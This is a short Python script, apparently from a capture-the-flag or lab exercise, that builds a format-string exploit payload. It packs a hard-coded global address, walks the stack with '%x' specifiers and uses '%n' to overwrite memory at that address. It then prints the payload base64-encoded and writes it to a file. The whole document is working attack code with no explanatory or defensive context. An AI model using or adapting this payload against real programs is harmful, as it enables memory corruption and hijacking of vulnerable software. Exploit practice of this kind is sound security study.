import struct
from base64 import b64encode

global_addr = 0x0804988c

payload = b"AAAA"
payload += struct.pack("I", global_addr)
payload += b"BBBB"
payload += b"%x " * 3
payload += b"%29x "  # need %35x on my local machine
payload += b"%n"

print(b64encode(payload).decode())

with open("payload", "wb") as f:
    f.write(payload)